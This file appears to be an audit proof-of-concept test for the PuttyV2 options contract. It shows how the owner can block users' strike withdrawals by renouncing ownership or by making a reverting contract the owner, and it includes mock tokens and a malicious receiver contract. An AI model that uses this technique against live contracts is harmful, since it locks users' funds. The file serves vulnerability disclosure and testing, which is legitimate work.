// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "openzeppelin/utils/cryptography/ECDSA.sol";

import "src/PuttyV2.sol";
import "../shared/Fixture.t.sol";

/**
 * @title ExploitTest - PoC for Withdraw DoS Vulnerability
 * @notice Demonstrates how the owner can prevent users from withdrawing their strike amount
 *
 * VULNERABILITY DESCRIPTION:
 * When users withdraw their strike escrowed in the Putty contract, the contract charges a fee
 * that is first sent to the contract owner. However, the owner can maliciously prevent all
 * withdrawals by either:
 *
 * Method #1: Renounce ownership to set owner to zero address
 * - Many ERC20 tokens (including OpenZeppelin's implementation) revert on transfer to zero address
 * - Owner can call renounceOwnership() to set owner() to zero address
 * - When owner() is zero address, the fee transfer at line 500 will revert
 * - This blocks all withdrawals for orders using such tokens as baseAsset
 *
 * Method #2: Owner is a malicious contract that reverts on receiving tokens
 * - For ERC777 tokens, the tokensReceived hook is called on the recipient
 * - A malicious owner contract can revert in this hook
 * - This blocks all withdrawals for orders using ERC777 tokens as baseAsset
 *
 * IMPACT:
 * Users cannot withdraw their strike amount and their assets become stuck in the contract.
 */
contract ExploitTest is Fixture {
    // Mock ERC20 that reverts on transfer to zero address (like OpenZeppelin's implementation)
    MockERC20WithZeroCheck internal tokenWithZeroCheck;

    // Malicious contract that reverts when receiving tokens
    MaliciousReceiver internal maliciousReceiver;

    // Mock ERC777-like token with transfer hook
    MockERC777 internal erc777Token;

    address[] internal floorTokens;
    PuttyV2.ERC20Asset[] internal erc20Assets;
    PuttyV2.ERC721Asset[] internal erc721Assets;
    uint256[] internal floorAssetTokenIds;

    function setUp() public {
        // Deploy token that reverts on transfer to zero address
        tokenWithZeroCheck = new MockERC20WithZeroCheck("Token With Zero Check", "TZERO", 18);

        // Deploy ERC777-like token
        erc777Token = new MockERC777("Mock ERC777", "M777", 18);

        // Deploy malicious receiver contract
        maliciousReceiver = new MaliciousReceiver();

        // Mint tokens to test accounts
        tokenWithZeroCheck.mint(address(this), 100000 ether);
        tokenWithZeroCheck.mint(babe, 100000 ether);
        erc777Token.mint(address(this), 100000 ether);
        erc777Token.mint(babe, 100000 ether);

        // Approve PuttyV2 to spend tokens
        tokenWithZeroCheck.approve(address(p), type(uint256).max);
        erc777Token.approve(address(p), type(uint256).max);

        vm.prank(babe);
        tokenWithZeroCheck.approve(address(p), type(uint256).max);

        vm.prank(babe);
        erc777Token.approve(address(p), type(uint256).max);
    }

    /**
     * @notice PoC for Method #1: Owner renounces ownership to set owner to zero address
     * @dev Demonstrates that withdrawals fail when owner is zero address and token reverts on zero transfer
     */
    function testExploit_WithdrawDoS_OwnerIsZeroAddress() public {
        // ============================================
        // STEP 1: Setup - Create and fill a short put order
        // ============================================
        console.log("\n=== STEP 1: Setup - Create and fill short put order ===");

        PuttyV2.Order memory order = defaultOrder();
        order.isLong = false;  // Short position
        order.isCall = false;  // Put option
        order.baseAsset = address(tokenWithZeroCheck);  // Use token that reverts on zero address transfer
        order.strike = 1000 ether;
        order.premium = 10 ether;

        // Set a fee so the vulnerability is triggered
        p.setFee(10); // 1% fee (10/1000)

        bytes memory signature = signOrder(babePrivateKey, order);

        console.log("Order maker (babe):", babe);
        console.log("Order taker (this):", address(this));
        console.log("Strike amount:", order.strike);
        console.log("Fee rate:", p.fee(), "(1%)");

        // Fill the order - babe is short, this contract is long
        p.fillOrder(order, signature, floorAssetTokenIds);
        console.log("Order filled successfully");

        // ============================================
        // STEP 2: Let the option expire (don't exercise)
        // ============================================
        console.log("\n=== STEP 2: Let option expire ===");
        skip(order.duration + 1);
        console.log("Time advanced past expiration");

        // ============================================
        // STEP 3: Verify withdrawal works with normal owner
        // ============================================
        console.log("\n=== STEP 3: Verify withdrawal works normally ===");
        uint256 balanceBefore = tokenWithZeroCheck.balanceOf(babe);
        console.log("Babe's balance before withdrawal:", balanceBefore);

        // This should work fine with normal owner
        vm.prank(babe);
        p.withdraw(order);

        uint256 balanceAfter = tokenWithZeroCheck.balanceOf(babe);
        console.log("Babe's balance after withdrawal:", balanceAfter);
        console.log("Amount received:", balanceAfter - balanceBefore);

        // Verify babe received the strike minus fee
        uint256 expectedFee = (order.strike * p.fee()) / 1000;
        assertEq(balanceAfter - balanceBefore, order.strike - expectedFee, "Should receive strike minus fee");

        // ============================================
        // STEP 4: EXPLOIT - Owner transfers ownership to zero address
        // ============================================
        console.log("\n=== STEP 4: EXPLOIT - Owner transfers to zero address ===");

        // Create another order to demonstrate the attack
        order.nonce = 6; // Different nonce for new order
        signature = signOrder(babePrivateKey, order);
        p.fillOrder(order, signature, floorAssetTokenIds);
        skip(order.duration + 1);

        console.log("Current owner:", p.owner());

        // Owner maliciously renounces ownership (sets owner to zero address)
        p.renounceOwnership();
        console.log("Ownership renounced, new owner:", p.owner());

        // ============================================
        // STEP 5: Demonstrate withdrawal is now blocked
        // ============================================
        console.log("\n=== STEP 5: Withdrawal is now blocked ===");

        // Attempt to withdraw should revert because token doesn't allow transfer to zero address
        // Note: SafeTransferLib wraps the error as "TRANSFER_FAILED"
        vm.prank(babe);
        vm.expectRevert("TRANSFER_FAILED");
        p.withdraw(order);

        console.log("SUCCESS: Withdrawal reverted as expected!");
        console.log("User's strike amount is now stuck in the contract");

        // Verify the strike is still in the contract
        assertEq(tokenWithZeroCheck.balanceOf(address(p)), order.strike, "Strike still locked in contract");
    }

    /**
     * @notice PoC for Method #2: Owner is a malicious contract that reverts on receiving tokens
     * @dev Demonstrates that withdrawals fail when owner contract reverts on token receipt
     */
    function testExploit_WithdrawDoS_MaliciousOwnerContract() public {
        // ============================================
        // STEP 1: Setup - Create and fill a short put order with ERC777 token
        // ============================================
        console.log("\n=== STEP 1: Setup - Create and fill short put order ===");

        PuttyV2.Order memory order = defaultOrder();
        order.isLong = false;  // Short position
        order.isCall = false;  // Put option
        order.baseAsset = address(erc777Token);  // Use ERC777-like token
        order.strike = 1000 ether;
        order.premium = 10 ether;

        // Set a fee so the vulnerability is triggered
        p.setFee(10); // 1% fee

        bytes memory signature = signOrder(babePrivateKey, order);

        console.log("Order maker (babe):", babe);
        console.log("Order taker (this):", address(this));
        console.log("Base asset (ERC777):", order.baseAsset);
        console.log("Strike amount:", order.strike);

        // Fill the order
        p.fillOrder(order, signature, floorAssetTokenIds);
        console.log("Order filled successfully");

        // ============================================
        // STEP 2: Let the option expire
        // ============================================
        console.log("\n=== STEP 2: Let option expire ===");
        skip(order.duration + 1);
        console.log("Time advanced past expiration");

        // ============================================
        // STEP 3: EXPLOIT - Transfer ownership to malicious contract
        // ============================================
        console.log("\n=== STEP 3: EXPLOIT - Transfer ownership to malicious contract ===");

        console.log("Current owner:", p.owner());
        console.log("Malicious receiver:", address(maliciousReceiver));

        // Owner transfers ownership to malicious contract
        p.transferOwnership(address(maliciousReceiver));
        console.log("Ownership transferred to malicious contract");

        // ============================================
        // STEP 4: Demonstrate withdrawal is blocked
        // ============================================
        console.log("\n=== STEP 4: Withdrawal is now blocked ===");

        // Attempt to withdraw should revert because malicious contract reverts on token receipt
        // Note: SafeTransferLib wraps the error as "TRANSFER_FAILED"
        vm.prank(babe);
        vm.expectRevert("TRANSFER_FAILED");
        p.withdraw(order);

        console.log("SUCCESS: Withdrawal reverted as expected!");
        console.log("User's strike amount is now stuck in the contract");

        // Verify the strike is still in the contract
        assertEq(erc777Token.balanceOf(address(p)), order.strike, "Strike still locked in contract");
    }

    /**
     * @notice Additional test: Demonstrate the attack also works for exercised call options
     * @dev When a call option is exercised, the short position holder should be able to withdraw the strike
     */
    function testExploit_WithdrawDoS_ExercisedCallOption() public {
        // ============================================
        // STEP 1: Setup - Create and fill a short call order
        // ============================================
        console.log("\n=== STEP 1: Setup - Create and fill short call order ===");

        PuttyV2.Order memory order = defaultOrder();
        order.isLong = false;  // Short position
        order.isCall = true;   // Call option
        order.baseAsset = address(tokenWithZeroCheck);
        order.strike = 1000 ether;
        order.premium = 10 ether;

        p.setFee(10); // 1% fee

        bytes memory signature = signOrder(babePrivateKey, order);
        p.fillOrder(order, signature, floorAssetTokenIds);
        console.log("Short call order filled");

        // ============================================
        // STEP 2: Long position exercises the call
        // ============================================
        console.log("\n=== STEP 2: Long position exercises the call ===");

        PuttyV2.Order memory longOrder = abi.decode(abi.encode(order), (PuttyV2.Order));
        longOrder.isLong = true;

        p.exercise(longOrder, floorAssetTokenIds);
        console.log("Call option exercised");

        // ============================================
        // STEP 3: EXPLOIT - Owner renounces ownership (sets to zero address)
        // ============================================
        console.log("\n=== STEP 3: EXPLOIT - Owner renounces ownership ===");

        p.renounceOwnership();
        console.log("Ownership renounced, owner is now zero address");

        // ============================================
        // STEP 4: Short position cannot withdraw strike
        // ============================================
        console.log("\n=== STEP 4: Short position cannot withdraw strike ===");

        // Note: SafeTransferLib wraps the error as "TRANSFER_FAILED"
        vm.prank(babe);
        vm.expectRevert("TRANSFER_FAILED");
        p.withdraw(order);

        console.log("SUCCESS: Withdrawal blocked for exercised call option!");
        console.log("Short position holder cannot access their strike payment");
    }
}

/**
 * @notice Mock ERC20 token that reverts on transfer to zero address
 * @dev Mimics OpenZeppelin's ERC20 implementation behavior
 */
contract MockERC20WithZeroCheck is ERC20 {
    constructor(
        string memory name_,
        string memory symbol_,
        uint8 decimals_
    ) ERC20(name_, symbol_, decimals_) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    // Override transfer to check for zero address
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        require(to != address(0), "ERC20: transfer to the zero address");
        return super.transfer(to, amount);
    }

    // Override transferFrom to check for zero address
    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        require(to != address(0), "ERC20: transfer to the zero address");
        return super.transferFrom(from, to, amount);
    }
}

/**
 * @notice Mock ERC777-like token with transfer hook
 * @dev Calls tokensReceived hook on recipient if it's a contract
 */
contract MockERC777 is ERC20 {
    constructor(
        string memory name_,
        string memory symbol_,
        uint8 decimals_
    ) ERC20(name_, symbol_, decimals_) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    // Override transfer to call hook on recipient
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        bool success = super.transfer(to, amount);
        // Call hook on recipient if it's a contract
        _callTokensReceived(msg.sender, msg.sender, to, amount);
        return success;
    }

    // Override transferFrom to call hook on recipient
    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        bool success = super.transferFrom(from, to, amount);
        // Call hook on recipient if it's a contract
        _callTokensReceived(msg.sender, from, to, amount);
        return success;
    }

    // Internal function to call the tokensReceived hook
    function _callTokensReceived(address operator, address from, address to, uint256 amount) internal {
        if (to.code.length > 0) {
            // Try to call the hook
            (bool success, bytes memory returnData) = to.call(
                abi.encodeWithSelector(
                    IERC777Recipient.tokensReceived.selector,
                    operator,
                    from,
                    to,
                    amount
                )
            );
            // Only revert if the call explicitly reverted (not if function doesn't exist)
            // Check if there's return data indicating an actual revert
            if (!success && returnData.length > 0) {
                // The call reverted with a reason, so we revert too
                assembly {
                    revert(add(returnData, 32), mload(returnData))
                }
            }
        }
    }
}

/**
 * @notice Interface for ERC777 recipient hook
 */
interface IERC777Recipient {
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount
    ) external;
}

/**
 * @notice Malicious contract that reverts when receiving tokens
 * @dev Used to demonstrate Method #2 of the attack
 */
contract MaliciousReceiver is IERC777Recipient {
    // Revert on receiving any tokens
    function tokensReceived(
        address /*operator*/,
        address /*from*/,
        address /*to*/,
        uint256 /*amount*/
    ) external pure override {
        revert("MaliciousReceiver: I refuse tokens!");
    }
}
